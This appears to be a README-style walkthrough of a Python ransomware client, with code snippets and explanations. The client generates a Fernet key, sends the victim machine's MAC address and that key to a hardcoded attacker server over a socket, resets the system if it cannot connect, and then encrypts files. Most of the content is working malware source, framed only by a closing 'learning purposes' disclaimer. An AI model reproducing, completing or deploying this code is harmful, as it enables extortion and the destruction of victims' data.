# Client Documentation

This Python module implements a simple ransomware that connects to a server, encrypts files, and decrypts them using the Fernet encryption algorithm. To use the ransomware, first import the necessary modules, including time, system utilities, encryption tools, and socket communication. Then, define the `Ransomware` class, initializing it with the server's host and port. Connect to the server using the `ConnectServer` method, which attempts to establish a connection and sends system information along with an encryption key. Once connected, you can encrypt files using the `Encrypted` method and decrypt them using the `Decrypted` method. Finally, instantiate the `Ransomware` class and execute the ransomware script, ensuring that the server's host and port are configured correctly.

1. **Import the necessary modules**:
   ```python
   from time import sleep
   from modules.system import System
   from modules.encdec import Fernet, Encrypt, Decrypt
   from socket import socket, AF_INET, SOCK_STREAM
   ```
This Python module implements a simple ransomware that connects to a server, encrypts files, and decrypts them using the Fernet encryption algorithm.

2. **Class Ransomware**:
    ```python
    def __init__(self, host: str, port: int) -> None:
        self.key = Fernet.generate_key()
        self.host = host
        self.port = port
        self.system: System = System()
        self.server: socket = socket(AF_INET, SOCK_STREAM)
        self.Private = Fernet(self.key)
    ```
- Generate a random encryption key, initialize System object. 
- Create a `socket` for communication and a `Fernet` instance for encryption/decryption.

    ```python
    def ConnectServer(self, connected = False) -> None:
        retries = 0
        while not connected and retries < 3:
            try:
                self.server.connect((self.host, self.port))
                self.server.sendall(f'{self.system.Mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
                connected = True
            except:
                retries += 1
                if retries < 3:
                    sleep(10)
                else:
                    System.reset()
            finally:
                self.server.close()
    ```
 - The `ConnectServer` method attempts to connect to the server via the provided IP address and port. If it cannot connect after 3 attempts, the system will reset.

    ```python
    def Encrypted(self):
        Encrypt(self.Private)
    
    def Decrypted(self):
        Decrypt(self.Private)
    ```
 - The `Encrypted` method encrypts data using the generated private key.
 - The `Decrypted` method decrypts data using the same private key.
    
    ```python
    if __name__ == '__main__':
        bot = Ransomware('192.168.1.12', 19100)
        bot.ConnectServer()
        bot.Encrypted()
    ```
 - When initializing a `Ransomware` object, you need to provide the IP address (`host`) and port (`port`) of the server you want to connect to.


**Please note**: *This code should only be used for learning purposes. Using it to perform illegal activities (such as cyber attacks) can lead to serious legal consequences. Always comply with legal regulations when using and developing open source code.*